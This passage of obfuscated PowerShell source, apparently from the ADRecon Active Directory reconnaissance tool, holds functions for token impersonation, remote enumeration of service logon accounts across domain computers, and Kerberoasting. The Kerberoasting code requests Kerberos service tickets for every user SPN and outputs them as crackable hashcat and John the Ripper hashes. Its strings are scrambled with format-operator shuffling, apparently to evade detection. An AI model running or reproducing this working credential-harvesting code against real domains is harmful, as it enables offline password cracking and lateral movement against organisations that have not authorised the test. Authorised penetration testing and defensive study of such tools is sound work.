            Write-Warning ("{2}{6}{7}{0}{1}{8}{5}{4}{3}"-f 'ADRGPORep','ort] Error getting t','[','ML','t in X','epor','Ge','t-','he GPOR')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
    }
    If ($Method -eq ("{0}{1}"-f'LD','AP'))
    {
        Write-Warning ("{12}{3}{4}{11}{8}{10}{7}{9}{1}{13}{2}{0}{6}{5}"-f ' with A','y supp','ed',' C','ur','S.','DW','the module i','nt','s onl','ly, ','re','[*]','ort')
    }
}

# Modified Invoke-UserImpersonation function from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
Function Get-ADRUserImpersonation
{
<#
.SYNOPSIS

Creates a new "runas /netonly" type logon and impersonates the token.

Author: Will Schroeder (@harmj0y)
License: BSD 3-Clause
Required Dependencies: PSReflect

.DESCRIPTION

This function uses LogonUser() with the LOGON32_LOGON_NEW_CREDENTIALS LogonType
to simulate "runas /netonly". The resulting token is then impersonated with
ImpersonateLoggedOnUser() and the token handle is returned for later usage
with Invoke-RevertToSelf.

.PARAMETER Credential

A [Management.Automation.PSCredential] object with alternate credentials
to impersonate in the current thread space.

.PARAMETER TokenHandle

An IntPtr TokenHandle returned by a previous Invoke-UserImpersonation.
If this is supplied, LogonUser() is skipped and only ImpersonateLoggedOnUser()
is executed.

.PARAMETER Quiet

Suppress any warnings about STA vs MTA.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred

.OUTPUTS

IntPtr

The TokenHandle result from LogonUser.
#>

    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = {"{0}{1}{3}{2}"-f'Cr','e','ial','dent'})]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = "Cr`edEnt`iaL")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential,

        [Parameter(Mandatory = $True, ParameterSetName = "tO`kenH`A`NDle")]
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle,

        [Switch]
        $Quiet
    )

    If (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters[("{1}{0}"-f 't','Quie')]))
    {
        Write-Warning ("{5}{10}{2}{16}{6}{20}{9}{22}{4}{17}{18}{3}{19}{15}{1}{8}{11}{0}{21}{12}{14}{13}{7}" -f'ona',', token i','onat','ent sta','threa','[Get-ADRUserI','n] powershel','t work.','mper',' is not cu','mpers','s','m',' no','ay','e','io','ded',' apartm','t','l.exe','tion ','rrently in a single-')
    }

    If ($PSBoundParameters[("{0}{1}{2}" -f'To','kenH','andle')])
    {
        $LogonTokenHandle = $TokenHandle
    }
    Else
    {
        $LogonTokenHandle = [IntPtr]::Zero
        $NetworkCredential = $Credential.GetNetworkCredential()
        $UserDomain = $NetworkCredential.Domain
        If (-Not $UserDomain)
        {
            Write-Warning ((("{15}{1}{11}{2}{13}{4}{3}{0}{8}{9}{12}{10}{6}{5}{14}{7}" -f 'D','et-ADRUser','personati',' Domain FQ','e credential with','}','omain FQDN>{0','me>)','N','. ','<D','Im','(','on] Us','<Userna','[G'))  -f[cHAr]92)
        }
        $UserName = $NetworkCredential.UserName
        Write-Warning "[Get-ADRUserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName) "

        # LOGON32_LOGON_NEW_CREDENTIALS = 9, LOGON32_PROVIDER_WINNT50 = 3
        #   this is to simulate "runas.exe /netonly" functionality
        $Result = $Advapi32::LogonUser($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle)
        $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

        If (-not $Result)
        {
            throw "[Get-ADRUserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
        }
    }

    # actually impersonate the token from LogonUser()
    $Result = $Advapi32::ImpersonateLoggedOnUser($LogonTokenHandle)

    If (-not $Result)
    {
        throw "[Get-ADRUserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    Write-Verbose ("{6}{9}{16}{15}{14}{3}{0}{17}{18}{19}{22}{12}{21}{11}{4}{2}{13}{20}{1}{8}{7}{10}{5}"-f'io','y','cces','sonat',' su','ated','[Get-AD','p',' im','R-Us','erson','als','cr','sful','er','rImp','e','n] ','Alt','ernat','l','edenti','e ')
    $LogonTokenHandle
}

# Modified Invoke-RevertToSelf function from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
Function Get-ADRRevertToSelf
{
<#
.SYNOPSIS

Reverts any token impersonation.

Author: Will Schroeder (@harmj0y)
License: BSD 3-Clause
Required Dependencies: PSReflect

.DESCRIPTION

This function uses RevertToSelf() to revert any impersonated tokens.
If -TokenHandle is passed (the token handle returned by Invoke-UserImpersonation),
CloseHandle() is used to close the opened handle.

.PARAMETER TokenHandle

An optional IntPtr TokenHandle returned by Invoke-UserImpersonation.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
$Token = Invoke-UserImpersonation -Credential $Cred
Invoke-RevertToSelf -TokenHandle $Token
#>

    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle
    )

    If ($PSBoundParameters[("{1}{2}{0}" -f 'dle','TokenHa','n')])
    {
        Write-Warning ("{5}{17}{10}{23}{13}{9}{18}{15}{14}{8}{11}{6}{7}{20}{4}{22}{0}{12}{24}{1}{3}{19}{2}{21}{16}"-f'o','r()','h',' toke',' L','[G','los','in','nd','Se','-ADR',' c','n','ertTo','ersonation a','en imp','le','et','lf] Reverting tok','n ','g','and','og','Rev','Use')
        $Result = $Kernel32::CloseHandle($TokenHandle)
    }

    $Result = $Advapi32::RevertToSelf()
    $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

    If (-not $Result)
    {
        Write-Error "[Get-ADRRevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    Write-Verbose ("{1}{0}{6}{3}{2}{8}{10}{4}{11}{9}{5}{7}"-f 'RevertToSelf] To','[Get-ADR',' ','n','fully ','ver','ke','ted','impersonation succe','e','ss','r')
}

# Modified Get-DomainSPNTicket function from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
Function Get-ADRSPNTicket
{
<#
<#
.SYNOPSIS
    Request the kerberos ticket for a specified service principal name (SPN).

    Author: machosec, Will Schroeder (@harmj0y)
    License: BSD 3-Clause
    Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf

.DESCRIPTION
    This function will either take one SPN strings, and will request a kerberos ticket for the given SPN using System.IdentityModel.Tokens.KerberosRequestorSecurityToken. The encrypted portion of the ticket is then extracted and output in either crackable Hashcat format.

.PARAMETER UserSPN
    [string]
    Service Principal Name.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $UserSPN
    )

    Try
    {
        $Null = [Reflection.Assembly]::LoadWithPartialName(("{1}{3}{0}{2}"-f 'IdentityMode','Sy','l','stem.'))
        $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
    }
    Catch
    {
        Write-Warning ('[Get'+'-A'+'DRS'+'PNTicket] '+'Er'+'ro'+'r '+'reque'+'sti'+'n'+'g '+'t'+'i'+'cket '+'f'+'or '+'SP'+'N '+"$UserSPN")
        Write-Warning "[EXCEPTION] $($_.Exception.Message) "
        Return $null
    }

    If ($Ticket)
    {
        $TicketByteStream = $Ticket.GetRequest()
    }

    If ($TicketByteStream)
    {
        $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'

        # TicketHexStream == GSS-API Frame (see https://tools.ietf.org/html/rfc4121#section-4.1)
        # No easy way to parse ASN1, so we'll try some janky regex to parse the embedded KRB_AP_REQ.Ticket object
        If ($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)')
        {
            $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
            $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
            $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)

            # Make sure the next field matches the beginning of the KRB_AP_REQ.Authenticator object
            If ($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne ("{1}{0}"-f'482','A'))
            {
                Write-Warning ('[Get-ADRSP'+'NT'+'icket]'+' '+'E'+'rror'+' '+'pa'+'rsing'+' '+'ci'+'pher'+'text'+' '+'for'+' '+'the'+' '+'S'+'PN '+' '+(('PY'+'Z(PY'+'ZT'+'i'+'cket.Se'+'rvicePri'+'nc'+'ipalName).') -rEPlaCe'PYZ',[cHar]36)) # Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq
                $Hash = $null
            }
            Else
            {
                $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
            }
        }
        Else
        {
            Write-Warning "[Get-ADRSPNTicket] Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). " # Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq
            $Hash = $null
        }
    }
    $Obj = New-Object PSObject
    $Obj | Add-Member -MemberType NoteProperty -Name ("{3}{2}{1}{0}" -f 'palName','ePrinci','vic','Ser') -Value $Ticket.ServicePrincipalName
    $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f 'E','type') -Value $Etype
    $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f 'sh','Ha') -Value $Hash
    Return $Obj
}

Function Get-ADRKerberoast
{
<#
.SYNOPSIS
    Returns all user service principal name (SPN) hashes in the current (or specified) domain.

.DESCRIPTION
    Returns all user service principal name (SPN) hashes in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $true)]
        [int] $PageSize
    )

    If ($Credential -ne [Management.Automation.PSCredential]::Empty)
    {
        $LogonToken = Get-ADRUserImpersonation -Credential $Credential
    }

    If ($Method -eq ("{0}{1}"-f 'AD','WS'))
    {
        Try
        {
            $ADUsers = Get-ADObject -LDAPFilter ((("{11}{6}{1}{15}{9}{16}{14}{13}{0}{10}{3}{8}{4}{5}{2}{7}{12}" -f'e',')','56','Ac','Control:1.2.840.','1135','ter','.1.4.8','count','icePr','=*)(!user','(&(!objectClass=compu','03:=2))','am','cipalN','(serv','in'))) -Properties sAMAccountName,servicePrincipalName,DistinguishedName -ResultPageSize $PageSize
        }
        Catch
        {
            Write-Warning ("{0}{7}{6}{14}{8}{5}{13}{1}{2}{4}{11}{9}{3}{12}{10}"-f'[','or',' w','ng U','hile enumera','t] E','RK','Get-AD','rberoas','i','N Objects','t','serSP','rr','e')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADUsers)
        {
            $UserSPNObj = @()
            $ADUsers | ForEach-Object {
                ForEach ($UserSPN in $_.servicePrincipalName)
                {
                    $Obj = New-Object PSObject
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f 'Usern','ame') -Value $_.sAMAccountName
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{4}{6}{0}{5}{3}{1}{2}" -f'vi','i','palName','rinc','Se','ceP','r') -Value $UserSPN

                    $HashObj = Get-ADRSPNTicket $UserSPN
                    If ($HashObj)
                    {
                        $UserDomain = $_.DistinguishedName.SubString($_.DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        # JohnTheRipper output format
                        $JTRHash = "`$krb5tgs`$$($HashObj.ServicePrincipalName):$($HashObj.Hash)"
                        # hashcat output format
                        $HashcatHash = "`$krb5tgs`$$($HashObj.Etype)`$*$($_.SamAccountName)`$$UserDomain`$$($HashObj.ServicePrincipalName)*`$$($HashObj.Hash)"
                    }
                    Else
                    {
                        $JTRHash = $null
                        $HashcatHash = $null
                    }
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f'Joh','n') -Value $JTRHash
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f'Hash','cat') -Value $HashcatHash
                    $UserSPNObj += $Obj
                }
            }
            Remove-Variable ADUsers
        }
    }

    If ($Method -eq ("{0}{1}"-f 'LD','AP'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = ("{15}{18}{8}{4}{10}{7}{19}{2}{12}{11}{3}{17}{1}{6}{16}{20}{14}{5}{22}{0}{13}{9}{25}{23}{21}{24}" -f 'ntCo','(','ipal','me=','ct','c','!us','o','bje','ol:1.2.840','Class=c','a','N','ntr','A','(&(','e','*)','!o','mputer)(servicePrinc','r','2','cou','.1.4.803:=','))','.113556')
        $ObjSearcher.PropertiesToLoad.AddRange((("{3}{0}{1}{2}" -f'istingui','shednam','e','d'),("{4}{1}{3}{2}{0}"-f 'name','acc','nt','ou','sam'),("{1}{0}{3}{2}{6}{4}{5}"-f'ervice','s','ri','p','ipalnam','e','nc'),("{1}{3}{4}{0}{2}" -f'acc','u','ountcontrol','s','er')))
        $ObjSearcher.SearchScope = ("{1}{0}"-f 'tree','Sub')
        Try
        {
            $ADUsers = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ("{0}{3}{2}{5}{4}{11}{9}{7}{14}{10}{8}{13}{6}{1}{12}" -f'[','t','ber','Get-ADRKer',' Err','oast]','c','e','N Ob','hile ','P','or w','s','je','numerating UserS')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADUsers)
        {
            $UserSPNObj = @()
            $ADUsers | ForEach-Object {
                ForEach ($UserSPN in $_.Properties.serviceprincipalname)
                {
                    $Obj = New-Object PSObject
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f'User','name') -Value $_.Properties.samaccountname[0]
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{3}{0}{4}{2}"-f'n','Servic','ipalName','ePri','c') -Value $UserSPN

                    $HashObj = Get-ADRSPNTicket $UserSPN
                    If ($HashObj)
                    {
                        $UserDomain = $_.Properties.distinguishedname[0].SubString($_.Properties.distinguishedname[0].IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        # JohnTheRipper output format
                        $JTRHash = "`$krb5tgs`$$($HashObj.ServicePrincipalName):$($HashObj.Hash)"
                        # hashcat output format
                        $HashcatHash = "`$krb5tgs`$$($HashObj.Etype)`$*$($_.Properties.samaccountname)`$$UserDomain`$$($HashObj.ServicePrincipalName)*`$$($HashObj.Hash)"
                    }
                    Else
                    {
                        $JTRHash = $null
                        $HashcatHash = $null
                    }
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f'hn','Jo') -Value $JTRHash
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{2}{1}"-f 'H','shcat','a') -Value $HashcatHash
                    $UserSPNObj += $Obj
                }
            }
            Remove-Variable ADUsers
        }
    }

    If ($LogonToken)
    {
        Get-ADRRevertToSelf -TokenHandle $LogonToken
    }

    If ($UserSPNObj)
    {
        Return $UserSPNObj
    }
    Else
    {
        Return $null
    }
}

# based on https://gallery.technet.microsoft.com/scriptcenter/PowerShell-script-to-find-6fc15ecb
Function Get-ADRDomainAccountsusedforServiceLogon
{
<#
.SYNOPSIS
    Returns all accounts used by services on computers in an Active Directory domain.

.DESCRIPTION
    Retrieves a list of all computers in the current domain and reads service configuration using Get-WmiObject.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    BEGIN {
        $readServiceAccounts = [scriptblock] {
            # scriptblock to retrieve service list form a remove machine
            $hostname = [string] $args[0]
            $OperatingSystem = [string] $args[1]
            #$Credential = [Management.Automation.PSCredential] $args[2]
            $Credential = $args[2]
            $timeout = 250
            $port = 135
            Try
            {
                $tcpclient = New-Object System.Net.Sockets.TcpClient
                $result = $tcpclient.BeginConnect($hostname,$port,$null,$null)
                $success = $result.AsyncWaitHandle.WaitOne($timeout,$null)
            }
            Catch
            {
                $warning = "$hostname ($OperatingSystem) is unreachable $($_.Exception.Message) "
                $success = $false
                $tcpclient.Close()
            }
            If ($success)
            {
                # PowerShellv2 does not support New-CimSession
                If ($PSVersionTable.PSVersion.Major -ne 2)
                {
                    If ($Credential -ne [Management.Automation.PSCredential]::Empty)
                    {
                        $session = New-CimSession -ComputerName $hostname -SessionOption $(New-CimSessionOption -Protocol DCOM) -Credential $Credential
                        If ($session)
                        {
                            $serviceList = @( Get-CimInstance -ClassName Win32_Service -Property Name,StartName,SystemName -CimSession $session -ErrorAction Stop)
                        }
                    }
                    Else
                    {
                        $session = New-CimSession -ComputerName $hostname -SessionOption $(New-CimSessionOption -Protocol DCOM)
                        If ($session)
                        {
                            $serviceList = @( Get-CimInstance -ClassName Win32_Service -Property Name,StartName,SystemName -CimSession $session -ErrorAction Stop )
                        }
                    }
                }
                Else
                {
                    If ($Credential -ne [Management.Automation.PSCredential]::Empty)
                    {
                        $serviceList = @( Get-WmiObject -Class Win32_Service -ComputerName $hostname -Credential $Credential -Impersonation 3 -Property Name,StartName,SystemName -ErrorAction Stop )
                    }
                    Else
                    {
                        $serviceList = @( Get-WmiObject -Class Win32_Service -ComputerName $hostname -Property Name,StartName,SystemName -ErrorAction Stop )
                    }
                }
                $serviceList
            }
            Try
            {
                If ($tcpclient) { $tcpclient.EndConnect($result) | Out-Null }
            }
            Catch
            {
                $warning = "$hostname ($OperatingSystem) : $($_.Exception.Message) "
            }
            $warning
        }

        Function processCompletedJobs()
        {
            # reads service list from completed jobs,
            # updates $serviceAccount table and removes completed job

            $jobs = Get-Job -State Completed
            ForEach( $job in $jobs )
            {
                If ($null -ne $job)
                {
                    $data = Receive-Job $job
                    Remove-Job $job
                }

                If ($data)
                {
                    If ( $data.GetType() -eq [Object[]] )
                    {
                        $serviceList = $data | Where-Object { if ($_.StartName) { $_ }}
                        $serviceList | ForEach-Object {
                            $Obj = New-Object PSObject
                            $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}{2}" -f'oun','Acc','t') -Value $_.StartName
                            $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}{2}{3}" -f 'Servi','ce ','N','ame') -Value $_.Name
                            $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{2}{0}" -f 'me','Syst','emNa') -Value $_.SystemName
                            If ($_.StartName.toUpper().Contains($currentDomain))
                            {
                                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{3}{5}{0}{2}{6}{4}" -f's D','Runni','omain ','ng ','er','a','Us') -Value $true
                            }
                            Else
                            {
                                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{6}{5}{2}{1}{4}{3}" -f'Runni','ain',' Dom','User',' ','g as','n') -Value $false
                            }
                            $script:serviceAccounts += $Obj
                        }
                    }
                    ElseIf ( $data.GetType() -eq [String] )
                    {
                        $script:warnings += $data
                        Write-Verbose $data
                    }
                }
            }
        }
    }

    PROCESS
    {
        $script:serviceAccounts = @()
        [string[]] $warnings = @()
        If ($Method -eq ("{0}{1}"-f'A','DWS'))
        {
            Try
            {
                $ADDomain = Get-ADDomain
            }
            Catch
            {
                Write-Warning ("{0}{6}{5}{16}{15}{13}{2}{1}{14}{3}{10}{9}{8}{7}{4}{11}{12}" -f'[G','ServiceLo','susedfor','rror','omain','-','et','D','g ','gettin',' ',' Co','ntext','unt','gon] E','DRDomainAcco','A')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            If ($ADDomain)
            {
                $currentDomain = $ADDomain.NetBIOSName.toUpper()
                Remove-Variable ADDomain
            }
            Else
            {
                $currentDomain = ""
                Write-Warning ("{2}{5}{1}{9}{10}{0}{6}{3}{4}{8}{7}" -f 'ain co','r','Cu','b','e ','r','uld not ','.','retrieved','en','t Dom')
            }

            Try
            {
                $ADComputers = Get-ADComputer -Filter { Enabled -eq $true -and OperatingSystem -Like ("{1}{2}{0}{3}"-f 'ows','*W','ind','*') } -Properties Name,DNSHostName,OperatingSystem
            }
            Catch
            {
                Write-Warning ("{6}{0}{2}{1}{15}{12}{7}{5}{4}{9}{14}{16}{11}{13}{8}{3}{17}{10}{18}" -f 't-AD','om','RD',' O','Lo','dforService','[Ge','ntsuse','Computer','go','t','Win','ccou','dows ','n] Error while e','ainA','numerating ','bjec','s')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }

            If ($ADComputers)
            {
                # start data retrieval job for each server in the list
                # use up to $Threads threads
                $cnt = $([ADRecon.ADWSClass]::ObjectCount($ADComputers))
                Write-Verbose ('['+'*] '+'Total'+' '+'W'+'in'+'dows '+'Ho'+'sts'+': '+"$cnt")
                $icnt = 0
                $ADComputers | ForEach-Object {
                    $StopWatch = [System.Diagnostics.StopWatch]::StartNew()
                    If( $_.dnshostname )
	                {
                        $args = @($_.DNSHostName, $_.OperatingSystem, $Credential)
		                Start-Job -ScriptBlock $readServiceAccounts -Name "read_$($_.name)" -ArgumentList $args | Out-Null
		                ++$icnt
		                If ($StopWatch.Elapsed.TotalMilliseconds -ge 1000)
                        {
                            Write-Progress -Activity ("{0}{3}{2}{1}{4}"-f'Re','om','rieving data fr','t',' servers') -Status "$("{0:N2}" -f (($icnt/$cnt*100),2)) % Complete:" -PercentComplete 100
                            $StopWatch.Reset()
                            $StopWatch.Start()
		                }
                        while ( ( Get-Job -State Running).count -ge $Threads ) { Start-Sleep -Seconds 3 }
		                processCompletedJobs
	                }
                }

                # process remaining jobs

                Write-Progress -Activity ("{2}{1}{5}{3}{4}{0}"-f 'servers','ie','Retr','fr','om ','ving data ') -Status ("{7}{0}{5}{4}{3}{2}{1}{6}"-f't','nd jobs to complete..',' backgrou','r','ng fo','i','.','Wai') -PercentComplete 100
                Wait-Job -State Running -Timeout 30  | Out-Null
                Get-Job -State Running | Stop-Job
                processCompletedJobs
                Write-Progress -Activity ("{0}{3}{1}{4}{5}{2}" -f'Ret','ving data ','rvers','rie','from s','e') -Completed -Status ("{0}{2}{1}" -f 'A',' Done','ll')
            }
        }

        If ($Method -eq ("{1}{0}" -f'P','LDA'))
        {
            $currentDomain = ([string]($objDomain.name)).toUpper()

            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            $ObjSearcher.PageSize = $PageSize
            $ObjSearcher.Filter = ((("{3}{15}{1}{14}{7}{9}{0}{5}{8}{11}{10}{12}{2}{6}{13}{4}"-f '(!userAccountControl:1','Acc','tem=','(&','dows*))','.2.840.1135','*','e=80530','56','6369)','=2)','.1.4.803:','(operatingSys','Win','ountTyp','(sam')))
            $ObjSearcher.PropertiesToLoad.AddRange((("{1}{0}" -f 'ame','n'),("{0}{1}{2}" -f'd','nshostna','me'),("{1}{3}{4}{2}{0}" -f'stem','o','ingsy','per','at')))
            $ObjSearcher.SearchScope = ("{1}{2}{0}" -f'tree','S','ub')

            Try
            {
                $ADComputers = $ObjSearcher.FindAll()
            }
            Catch
            {
                Write-Warning ("{15}{14}{25}{4}{20}{21}{19}{8}{7}{6}{1}{0}{16}{10}{24}{5}{3}{26}{18}{17}{9}{23}{22}{2}{13}{11}{12}" -f'g','dforServiceLo','t','umerat','RD',' en','e','sus','nAccount','ndo','n] Error ','bject','s','er O','e','[G','o','i','W','i','om','a','mpu','ws Co','while','t-AD','ing ')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            $ObjSearcher.dispose()

            If ($ADComputers)
            {
                # start data retrieval job for each server in the list
                # use up to $Threads threads
                $cnt = $([ADRecon.LDAPClass]::ObjectCount($ADComputers))
                Write-Verbose ('[*'+'] '+'Tot'+'al'+' '+'Wind'+'ows'+' '+'Host'+'s'+': '+"$cnt")
                $icnt = 0
                $ADComputers | ForEach-Object {
                    If( $_.Properties.dnshostname )
	                {
                        $args = @($_.Properties.dnshostname, $_.Properties.operatingsystem, $Credential)
		                Start-Job -ScriptBlock $readServiceAccounts -Name "read_$($_.Properties.name)" -ArgumentList $args | Out-Null
		                ++$icnt
		                If ($StopWatch.Elapsed.TotalMilliseconds -ge 1000)
                        {
		                    Write-Progress -Activity ("{5}{0}{4}{3}{6}{2}{1}"-f 'ie',' servers','rom','da','ving ','Retr','ta f') -Status "$("{0:N2}" -f (($icnt/$cnt*100),2)) % Complete:" -PercentComplete 100
                            $StopWatch.Reset()
                            $StopWatch.Start()
		                }
		                while ( ( Get-Job -State Running).count -ge $Threads ) { Start-Sleep -Seconds 3 }
		                processCompletedJobs
	                }
                }

                # process remaining jobs
                Write-Progress -Activity ("{4}{5}{0}{3}{2}{1}" -f'rieving data','s','server',' from ','Re','t') -Status ("{4}{8}{3}{1}{9}{7}{5}{6}{0}{10}{2}" -f'p',' ','..','ng','Wa','kground jobs to ','com','r bac','iti','fo','lete.') -PercentComplete 100
                Wait-Job -State Running -Timeout 30  | Out-Null
                Get-Job -State Running | Stop-Job
                processCompletedJobs
                Write-Progress -Activity ("{1}{6}{4}{3}{5}{0}{2}"-f 'm se','Re','rvers','fr','ving data ','o','trie') -Completed -Status ("{0}{1}{2}"-f'Al','l Don','e')
            }
        }

        If ($script:serviceAccounts)
        {
            Return $script:serviceAccounts
        }
        Else
        {
            Return $null
        }
    }
}

Function Remove-EmptyADROutputDir
{
<#
.SYNOPSIS
    Removes ADRecon output folder if empty.

.DESCRIPTION
    Removes ADRecon output folder if empty.

.PARAMETER ADROutputDir
    [string]
	Path for ADRecon output folder.

.PARAMETER OutputType
    [array]
    Output Type.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $ADROutputDir,

        [Parameter(Mandatory = $true)]
        [array] $OutputType
    )

    Switch ($OutputType)
    {
        'CSV'
        {
            $CSVPath  = -join($ADROutputDir,'\',("{0}{1}{2}"-f'C','SV-File','s'))
            If (!(Test-Path -Path $CSVPath\*))
            {
                Write-Verbose ('R'+'emoved'+' '+'Em'+'pty '+'Dire'+'ctor'+'y '+"$CSVPath")
                Remove-Item $CSVPath
            }
        }
        'XML'
        {
            $XMLPath  = -join($ADROutputDir,'\',("{1}{0}{2}" -f 'L-Fil','XM','es'))
            If (!(Test-Path -Path $XMLPath\*))
            {
                Write-Verbose ('R'+'emo'+'ved '+'Empt'+'y'+' '+'Direc'+'to'+'ry '+"$XMLPath")
                Remove-Item $XMLPath
            }
        }
        ("{1}{0}"-f 'N','JSO')
        {
            $JSONPath  = -join($ADROutputDir,'\',("{2}{1}{0}"-f '-Files','ON','JS'))
            If (!(Test-Path -Path $JSONPath\*))
            {
                Write-Verbose ('Remove'+'d'+' '+'Empty'+' '+'Direc'+'t'+'or'+'y '+"$JSONPath")
                Remove-Item $JSONPath
            }
        }
        ("{0}{1}"-f'HT','ML')
        {
            $HTMLPath  = -join($ADROutputDir,'\',("{1}{2}{3}{0}" -f '-Files','HT','M','L'))
            If (!(Test-Path -Path $HTMLPath\*))
            {
                Write-Verbose ('Re'+'move'+'d '+'Emp'+'ty '+'Dire'+'ct'+'or'+'y '+"$HTMLPath")
                Remove-Item $HTMLPath
            }
        }
    }
    If (!(Test-Path -Path $ADROutputDir\*))
    {
        Remove-Item $ADROutputDir
        Write-Verbose ('Remov'+'e'+'d '+'Em'+'pty '+'Direc'+'tor'+'y '+"$ADROutputDir")
    }
}

Function Get-ADRAbout
{
<#
.SYNOPSIS
    Returns information about ADRecon.

.DESCRIPTION
    Returns information about ADRecon.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER date
    [DateTime]
    Date

.PARAMETER ADReconVersion
    [string]
    ADRecon Version.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.PARAMETER RanonComputer
    [string]
    Details of the Computer running ADRecon.

.PARAMETER TotalTime
    [string]
    TotalTime.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $true)]
        [DateTime] $date,

        [Parameter(Mandatory = $true)]
        [string] $ADReconVersion,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $true)]
        [string] $RanonComputer,

        [Parameter(Mandatory = $true)]
        [string] $TotalTime
    )

